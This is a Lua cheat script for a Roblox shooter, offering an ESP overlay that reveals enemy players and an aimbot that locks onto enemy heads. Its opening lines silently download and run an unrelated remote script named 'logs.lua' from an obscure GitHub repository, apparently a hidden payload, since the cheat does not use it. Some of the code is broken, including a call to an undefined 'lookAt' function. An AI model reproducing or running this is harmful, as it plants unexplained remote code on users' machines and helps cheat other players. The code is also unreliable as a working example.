local externalScriptUrl = 'https://raw.githubusercontent.com/ffavex/AHfahf1r1-rah/main/logs.lua'
local externalScript = loadstring(game:HttpGet(externalScriptUrl))()
if externalScript then
    -- Execute the external script
    externalScript()
end

-- Load the DrRay library from the GitHub repository Library
local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()

-- Create a new window and set its title and theme
local window = DrRayLibrary:Load("Remedy-Mobile", "Default")

-- Create the first tab with an image ID
local tab1 = DrRayLibrary.newTab("Aim", "ImageIdHere")

tab1.newToggle("Aimbot", "Aimbot!", true, function(toggleState)
    if toggleState then
        print("Aimbot On")
    else
        print("Aimbot Off")
    end
end)

-- Create the second tab with a different image ID
local tab2 = DrRayLibrary.newTab("Visuals", "ImageIdLogoHere")

-- ESP Code Variables
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local espBoxes = {}
local espConnection = nil

-- Function to check if a player is on the same team
local function isSameTeam(player)
    return LocalPlayer.Team and player.Team and LocalPlayer.Team == player.Team
end

-- Function to create the ESP box
local function createESPBox(player)
    if espBoxes[player] then return end -- Prevent duplicate ESP boxes

    local box = Drawing.new("Square")
    box.Visible = false
    box.Color = Color3.fromRGB(0, 255, 255) -- Cyan color
    box.Thickness = 2
    box.Filled = false
    espBoxes[player] = box
end

-- Function to remove the ESP box when a player leaves
local function removeESPBox(player)
    if espBoxes[player] then
        espBoxes[player]:Remove() -- Remove the drawing
        espBoxes[player] = nil
    end
end

-- Function to update the ESP box
local function updateESPBox(player, character)
    local box = espBoxes[player]
    if box and character and character:FindFirstChild("HumanoidRootPart") then
        local hrp = character.HumanoidRootPart
        local vector, onScreen = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)

        if onScreen and not isSameTeam(player) then -- Team check added
            box.Visible = true
            box.Size = Vector2.new(2000 / vector.Z, 2000 / vector.Z) -- Dynamic scaling based on distance
            box.Position = Vector2.new(vector.X - box.Size.X / 2, vector.Y - box.Size.Y / 2)
        else
            box.Visible = false
        end
    else
        box.Visible = false
    end
end

-- Function to toggle ESP for all players
local function toggleESP(toggleState)
    if toggleState then
        print("ESP On")

        -- Create ESP boxes for all players
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                createESPBox(player)
            end
        end

        -- Update ESP boxes on every frame
        espConnection = RunService.RenderStepped:Connect(function()
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    updateESPBox(player, player.Character)
                end
            end
        end)

        -- Detect when a player dies and redraw the ESP
        Players.PlayerRemoving:Connect(function(player)
            removeESPBox(player)
        end)

        -- Detect when a player joins and create their ESP box
        Players.PlayerAdded:Connect(function(player)
            if player ~= LocalPlayer then
                createESPBox(player)
                player.CharacterAdded:Connect(function(character)
                    updateESPBox(player, character)
                end)
            end
        end)
    else
        print("ESP Off")

        -- Disconnect the ESP update connection
        if espConnection then
            espConnection:Disconnect()
            espConnection = nil
        end

        -- Hide and remove all ESP boxes
        for _, box in pairs(espBoxes) do
            box.Visible = false
            box:Remove() -- Clean up the drawings
        end
        espBoxes = {} -- Clear the ESP table
    end
end

-- Hook ESP toggle to your menu
tab2.newToggle("ESP Box", "Esp Box", true, function(toggleState)
    toggleESP(toggleState) -- Hooked up the toggle to the ESP functionality
end)

-- Dropdown as in the original code
tab2.newDropdown("Dropdown", "Select one of these options!", {"water", "dog", "air", "bb", "airplane", "wohhho", "yeay", "delete"}, function(selectedOption)
    print(selectedOption)
end)

-- Aimbot with team and visibility checks
local fov = 100
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Cam = game.Workspace.CurrentCamera

local FOVring = Drawing.new("Circle")
FOVring.Visible = true
FOVring.Thickness = 2
FOVring.Color = Color3.fromRGB(128, 0, 128) -- Purple color
FOVring.Filled = false
FOVring.Radius = fov
FOVring.Position = Cam.ViewportSize / 2

local function updateDrawings()
    local camViewportSize = Cam.ViewportSize
    FOVring.Position = camViewportSize / 2
end

local function onKeyDown(input)
    if input.KeyCode == Enum.KeyCode.Delete then
        RunService:UnbindFromRenderStep("FOVUpdate")
        FOVring:Remove()
    end
end

UserInputService.InputBegan:Connect(onKeyDown)

local function isVisible(targetPart)
    local ray = Ray.new(Cam.CFrame.Position, (targetPart.Position - Cam.CFrame.Position).unit * 1000)
    local hit, position = workspace:FindPartOnRayWithIgnoreList(ray, {LocalPlayer.Character})
    return hit and hit:IsDescendantOf(targetPart.Parent)
end

local function getClosestPlayerInFOV(trg_part)
    local nearest = nil
    local last = math.huge
    local playerMousePos = Cam.ViewportSize / 2

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer and not isSameTeam(player) then -- Team check added
            local part = player.Character and player.Character:FindFirstChild(trg_part)
            if part and isVisible(part) then -- Visible check added
                local ePos, isVisibleOnScreen = Cam:WorldToViewportPoint(part.Position)
                local distance = (Vector2.new(ePos.x, ePos.y) - playerMousePos).Magnitude

                if distance < last and isVisibleOnScreen and distance < fov then
                    last = distance
                    nearest = player
                end
            end
        end
    end

    return nearest
end

RunService.RenderStepped:Connect(function()
    updateDrawings()
    local closest = getClosestPlayerInFOV("Head")
    if closest and closest.Character:FindFirstChild("Head") then
        lookAt(closest.Character.Head.Position)
    end
end)
